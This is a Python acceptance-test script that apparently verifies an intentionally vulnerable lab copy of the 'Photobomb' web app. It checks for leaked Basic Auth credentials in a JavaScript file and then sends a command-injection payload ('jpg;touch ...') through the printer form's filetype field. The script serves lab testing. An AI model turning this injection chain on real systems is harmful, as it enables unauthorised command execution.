#!/usr/bin/env python3
"""Attacker-side acceptance for the real Sinatra/ImageMagick command path."""
import base64
import socket
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://photobomb-target"
def get(path, auth=False):
    req = urllib.request.Request(BASE + path)
    if auth:
        token = base64.b64encode(b"pH0t0:b0Mb!").decode()
        req.add_header("Authorization", "Basic " + token)
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            return res.status, res.headers, res.read()
    except urllib.error.HTTPError as err:
        return err.code, err.headers, err.read()

with socket.create_connection(("photobomb-target", 22), timeout=5) as sock:
    assert sock.recv(128).startswith(b"SSH-2.0-"), "OpenSSH banner missing"

status, _, home = get("/")
assert status == 200 and b"Welcome to your new Photobomb franchise" in home
status, _, js = get("/photobomb.js")
assert status == 200 and b"pH0t0" in js and b"b0Mb!" in js, "Credential discovery clue missing"
status, _, _ = get("/printer")
assert status == 401, f"/printer should require HTTP Basic auth, got {status}"
status, _, page = get("/printer", auth=True)
assert status == 200 and b"Select an image" in page and b"voicu-apostol" in page

body = urllib.parse.urlencode({
    "photo": "voicu-apostol-MWER49YaD-M-unsplash.jpg",
    "filetype": "jpg",
    "dimensions": "600x400"
}).encode()
req = urllib.request.Request(BASE + "/printer", data=body, headers={
    "Authorization": "Basic " + base64.b64encode(b"pH0t0:b0Mb!").decode(),
    "Content-Type": "application/x-www-form-urlencoded"
})
with urllib.request.urlopen(req, timeout=20) as res:
    assert res.status == 200 and res.headers.get("Content-Type", "").startswith("image/jpeg")
    assert res.read().startswith(b"\xff\xd8"), "ImageMagick did not return a JPEG"

injection = urllib.parse.urlencode({
    "photo": "voicu-apostol-MWER49YaD-M-unsplash.jpg",
    "filetype": "jpg;touch /tmp/photobomb-command-executed",
    "dimensions": "300x200"
}).encode()
req = urllib.request.Request(BASE + "/printer", data=injection, headers={
    "Authorization": "Basic " + base64.b64encode(b"pH0t0:b0Mb!").decode(),
    "Content-Type": "application/x-www-form-urlencoded"
})
try:
    urllib.request.urlopen(req, timeout=15).read()
except urllib.error.HTTPError:
    pass
print("PASS: recon -> hidden Basic Auth credentials -> Sinatra printer -> real ImageMagick command injection")
